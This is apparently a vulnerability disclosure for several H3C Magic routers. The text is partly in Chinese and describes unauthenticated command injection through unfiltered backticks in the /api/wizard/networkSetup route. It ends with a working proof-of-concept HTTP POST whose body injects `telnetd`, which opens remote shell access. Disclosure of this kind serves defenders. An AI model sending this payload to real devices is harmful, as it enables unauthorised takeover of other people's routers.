## Information

**Vendor of the products:** H3C Technologies Co., Ltd.

**Vendor's website:** https://www.h3c.com/

**Reported by:** Guan Qing Wen(2144987805@qq.com)

**Affected products:** H3C Magic NX15\H3C NX400\H3C Magic R3010\H3C Magic BE18000\H3C Magic NX30 Pro

**Affected firmware version:** <=V100R014 (Taking NX15 as an example.)

**Firmware download address:** [H3C NX15V100R014](https://www.h3c.com/cn/d_202409/2263952_30005_0.htm)

## Overview

在 `H3C` 的 `Magic` 系列产品中 `H3C Magic NX15\H3C NX400\H3C Magic R3010\H3C Magic BE18000\H3C Magic NX30 Pro` ，允许攻击者在未授权情况下向 `/api/wizard/networkSetup` 路由发送构造的特定 `POST` 数据包，实现获取设备最高权限。

## Vulnerability details

在 `api` 文件中的 `FCGI_WizardProcess` 函数存在路由 `/wizard/networkSetup` ，可以触发对应的处理函数

![image-20250314125647586](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250314125647586.png)

因为危险字符忘记过滤反引号，导致命令注入

![image-20250314125713058](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250314125713058.png)

## Poc

```
POST /api/wizard/networkSetup HTTP/1.1
Host: 192.168.124.1
Content-Length: 11
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Origin: http://192.168.124.1
Referer: http://192.168.124.1/home
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

'`telnetd`'
```

